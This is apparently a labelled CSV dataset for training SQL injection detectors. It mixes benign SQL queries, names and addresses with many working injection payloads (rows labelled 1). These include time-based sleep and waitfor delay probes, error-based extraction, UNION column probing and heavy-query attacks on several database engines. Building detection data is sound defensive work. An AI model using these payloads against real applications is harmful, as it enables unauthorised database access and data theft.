Sentence,Label,Processed_Sentence
"  SELECT HOUR ( ""2017-06-20 09:34:00"" ) ;",0.0,"  select hour ( ""0-0-0 0:0:0"" ) ;"
SELECT although ( s )  FROM diagram UNION,0.0,select although ( s )  from diagram union
" SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NOT NULL;",0.0," select customername, contactname, address from customers where address  is not null;"
amalio,0.0,amalio
boony,0.0,boony
"  SELECT track AS be, increase AS [task]  FROM on",0.0,"  select track as be, increase as [task]  from on"
p05f74a.r,0.0,p0f0a.r
7497,0.0,0
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1.0,0'+  (  select shec where 0  =  0 and 0  =    (  select 0 from pg_sleep  (  0   )    )     )  +'
sugesto,0.0,sugesto
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",1.0,"0""  )   waitfor delay '0:0:0' and   (  ""hhzy"" like ""hhzy"
SELECT eager FROM has UNION SELECT were FROM gas ORDER BY around,0.0,select eager from has union select were from gas order by around
SELECT AVG ( knife ) FROM characteristic,0.0,select avg ( knife ) from characteristic
rechinido,0.0,rechinido
-6412%' or 4065  =  5815 and '%'  =  ',1.0,-0%' or 0  =  0 and '%'  =  '
10263,0.0,0
SELECT * FROM discover  WHERE every = married,0.0,select * from discover  where every = married
SELECT * FROM spider WHERE observe IN  ( SELECT girl FROM everything ) ,0.0,select * from spider where observe in  ( select girl from everything ) 
"-9820"" or 1038  =  7502#",1.0,"-0"" or 0  =  0#"
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1.0,-0'   )    )    or   (  0  =  0  )  *0 and    (    (   'ejhp'  =  'ejhp
SELECT * FROM harder  WHERE according = birth,0.0,select * from harder  where according = birth
wilmont,0.0,wilmont
SELECT AVG ( mix ) FROM write SELECT SUM ( harder ) ,0.0,select avg ( mix ) from write select sum ( harder ) 
"   SELECT brought, worth, lady FROM stand WHERE current  IS NULL",0.0,"   select brought, worth, lady from stand where current  is null"
SELECT * FROM motor  WHERE rhyme = original,0.0,select * from motor  where rhyme = original
1  )   where 9078  =  9078 rlike sleep  (  5  )  #,1.0,0  )   where 0  =  0 rlike sleep  (  0  )  #
SELECT COUNT ( rope ) FROM exercise,0.0,select count ( rope ) from exercise
1  )   where 5866  =  5866 and 4595  =  4595#,1.0,0  )   where 0  =  0 and 0  =  0#
vasil9,0.0,vasil0
"1'||  (  select 'fcnb' where 2869  =  2869 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1.0,"0'||  (  select 'fcnb' where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0   )    )   ||'"
63545647m,0.0,0m
oplinger,0.0,oplinger
ado,0.0,ado
73107657h,0.0,0h
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1.0,"0"" or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk"
"   SELECT COUNT ( pond ) , sale FROM mission BY atmosphere",0.0,"   select count ( pond ) , sale from mission by atmosphere"
SELECT DISTINCT occasionally FROM wonder,0.0,select distinct occasionally from wonder
tamer,0.0,tamer
"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",1.0,"-0'||  (  select 'vhcp' from dual where 0  =  0 union all select 0,0,0,0--"
SELECT * FROM came WHERE green = 'quickly'  OR matter = 'deal',0.0,select * from came where green = 'quickly'  or matter = 'deal'
"   SELECT COUNT ( CustomerID ) , CountryFROM CustomersGROUP BY Country",0.0,"   select count ( customerid ) , countryfrom customersgroup by country"
5349290000000000,0.0,0
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'oucg'  =  'oucg",1.0,"0'   )    )    and elt  (  0  =  0,0  )   and    (    (   'oucg'  =  'oucg"
SELECT * FROM stuck WHERE gravity  BETWEEN 10 AND 20,0.0,select * from stuck where gravity  between 0 and 0
SELECT * FROM production,0.0,select * from production
11140,0.0,0
"   SELECT should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach AS facing  FROM stopped",0.0,"   select should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach as facing  from stopped"
navas de san juan,0.0,navas de san juan
"1"" where 9756  =  9756",1.0,"0"" where 0  =  0"
"calle blas infante 52, 6-h",0.0,"calle blas infante 0, 0-h"
getulio,0.0,getulio
"1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0  )   as yduh where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
"SELECT column_name FROM table1 T1, table1 T2 WHERE condition ;",0.0,"select column_name from table0 t0, table0 t0 where condition ;"
"-7714 where 9768  =  9768 union all select 9768,9768--",1.0,"-0 where 0  =  0 union all select 0,0--"
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1.0,"-0%""   )    )     )   or 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )   and    (    (     (  ""%""  =  """
ketley,0.0,ketley
"-6848""   )    )    or 4071  =  5312",1.0,"-0""   )    )    or 0  =  0"
SELECT rising ( s )  FROM condition SELECT development ( s ) ,0.0,select rising ( s )  from condition select development ( s ) 
"  SELECT add,putting,frame FROM clean LEFT JOIN Orders ON recently.courseID =  cage.thirty ORDER BY planet.though",0.0,"  select add,putting,frame from clean left join orders on recently.courseid =  cage.thirty order by planet.though"
"1',  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1.0,"0',  (  select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from master..sysdatabases  )   end   )    )   "
hillerman.gallo@muebetuweb.ki,0.0,hillerman.gallo@muebetuweb.ki
SELECT * FROM in WHERE curious BETWEEN thin09/01/1996nor AND lack15/31/1996personal,0.0,select * from in where curious between thin0/0/0nor and lack0/0/0personal
SELECT * FROM slept,0.0,select * from slept
SELECT * FROM tired WHERE tank = 'including' LIMIT 3,0.0,select * from tired where tank = 'including' limit 0
"c/ xeixa, 189 8?d",0.0,"c/ xeixa, 0 0?d"
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1.0,0' rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  sgvo  ) 
santa catalina 81,0.0,santa catalina 0
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0%' or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1.0,-0'  )   where 0  =  0 or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )  --
22120,0.0,0
"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1.0,"0%"" and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and ""%""  =  """
9.0199E+015,0.0,0.0e+0
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1.0,0'  )   as llug where 0  =  0 and 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )  --
dec4mas8xt6,0.0,dec0mas0xt0
SELECT those FROM rear,0.0,select those from rear
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1.0,"0'||  (  select 'lpej' from dual where 0  =  0 or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'"
43790,0.0,0
5192,0.0,0
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0  )   as adzj where 0  =  0 or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from rule where seeing between '0-0-0' and '0-0-0'
theo,0.0,theo
SELECT adjective ( s )  FROM short,0.0,select adjective ( s )  from short
"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""nrhz"" like ""nrhz",1.0,"0""   )    )     )   or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and    (    (     (  ""nrhz"" like ""nrhz"
SELECT * FROM bite WHERE dish NOT LIKE '[policeman]%',0.0,select * from bite where dish not like '[policeman]%'
"1'+  (  select lang where 4191  =  4191 union all select null,null#",1.0,"0'+  (  select lang where 0  =  0 union all select null,null#"
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1.0,"0'  )   and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  "
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,1.0,0'||  (  select 'bwqc' from dual where 0  =  0 and sleep  (  0  )  #
SELECT COUNT ( natural ) FROM something,0.0,select count ( natural ) from something
mamakos@palodegolf.com.rw,0.0,mamakos@palodegolf.com.rw
SELECT pleasure ( s )  FROM wire LEFT JOIN,0.0,select pleasure ( s )  from wire left join
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1.0,"0%""   )    )    or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )    and    (    (   ""%""  =  """
e7ato,0.0,e0ato
SELECT * FROM almost WHERE substance = 'garage' FETCH FIRST 3 ROWS ONLY,0.0,select * from almost where substance = 'garage' fetch first 0 rows only
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1.0, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --
desans totohuetotzint,0.0,desans totohuetotzint
1'   )    )     )   and 8162  =  1687 and    (    (     (  'tdyr' like 'tdyr,1.0,0'   )    )     )   and 0  =  0 and    (    (     (  'tdyr' like 'tdyr
schouwen,0.0,schouwen
nowack@softwaresaas.bm,0.0,nowack@softwaresaas.bm
SELECT * FROM fifth WHERE    NOT north = 'furniture',0.0,select * from fifth where    not north = 'furniture'
DELETE FROM colony,0.0,delete from colony
po29ip1t0l6,0.0,po0ip0t0l0
-7971' union all select 4273#,1.0,-0' union all select 0#
SELECT but ( s ) FROM cake INNER JOIN,0.0,select but ( s ) from cake inner join
"   SELECT establish, instead+ ', ' + general+ ' ' + ants+ ', ' + slipped AS stood  FROM person",0.0,"   select establish, instead+ ', ' + general+ ' ' + ants+ ', ' + slipped as stood  from person"
alobras,0.0,alobras
koolwine,0.0,koolwine
ruben,0.0,ruben
r8cid0va,0.0,r0cid0va
SELECT TOP 50 PERCENT * FROM coming SELECT * FROM location FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM found,0.0,select top 0 percent * from coming select * from location fetch first 0 percent rows onlyselect top 0 * from found
"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1.0,"0'+  (  select dagm where 0  =  0 or 0  =  benchmark  (  0,md0  (  0x0a0   )    )     )  +'"
8912,0.0,0
villanueva gualano,0.0,villanueva gualano
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",1.0,"0'   )    )     )   procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )   and    (    (     (  'gfll'  =  'gfll"
SELECT TOP 3 * FROM mad SELECT * FROM dollar 3SELECT * FROM ruler,0.0,select top 0 * from mad select * from dollar 0select * from ruler
SELECT * FROM planet WHERE nest = 'steam' LIMIT 3,0.0,select * from planet where nest = 'steam' limit 0
-2625'   )    )    or 3038  =  3038,1.0,-0'   )    )    or 0  =  0
"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",1.0,"-0'  )   union all select 0,0,0,0,0,0,0,0,0,0--"
rivalee,0.0,rivalee
SELECT TOP 3 * FROM depend WHERE piano = 'best',0.0,select top 0 * from depend where piano = 'best'
1%'   )    )     )   and 2444  =  9282#,1.0,0%'   )    )     )   and 0  =  0#
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0"" and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
"""   )    )    or pg_sleep  (  __TIME__  )  --",1.0,"""   )    )    or pg_sleep  (  __time__  )  --"
"1'+  (  select qymy where 8657  =  8657 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0'+  (  select qymy where 0  =  0 and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
celadas,0.0,celadas
SELECT invented ( s )  FROM rays UNION,0.0,select invented ( s )  from rays union
18439608w,0.0,0w
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx",1.0,"0""   )    )    or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx"
SELECT COUNT ( paper )  FROM basic,0.0,select count ( paper )  from basic
"-3719"" union all select 6609,6609,6609,6609#",1.0,"-0"" union all select 0,0,0,0#"
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0.0,select * from repeat where game = 'field' limit 0
SELECT * FROM news WHERE gently NOT LIKE '[paper]%',0.0,select * from news where gently not like '[paper]%'
"INSERT INTO am  ( ball, especially, fellow )  VALUES  ( 'off', 'your', 'surrounded' )  ",0.0,"insert into am  ( ball, especially, fellow )  values  ( 'off', 'your', 'surrounded' )  "
eugen-fargue@andrestabernero.im,0.0,eugen-fargue@andrestabernero.im
SELECT dirty ( s ) FROM matter INNER JOIN,0.0,select dirty ( s ) from matter inner join
flis@14horas.gt,0.0,flis@0horas.gt
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from trap fetch first 0 percent rows only
merriell,0.0,merriell
SELECT below ( s )  FROM dear UNION,0.0,select below ( s )  from dear union
"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0%"" and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
SELECT * FROM wp_users WHERE ID  =  '1' LIMIT 1,0.0,select * from wp_users where id  =  '0' limit 0
SELECT save ( s )  FROM fairly UNION ALL,0.0,select save ( s )  from fairly union all
" select sleep  (  5  )   and ""%""  =  """,1.0," select sleep  (  0  )   and ""%""  =  """
SELECT AVG ( swam ) FROM talk SELECT SUM ( today ) ,0.0,select avg ( swam ) from talk select sum ( today ) 
23215,0.0,0
-8828%'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',1.0,-0%'   )    )     )   or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (     (  '%'  =  '
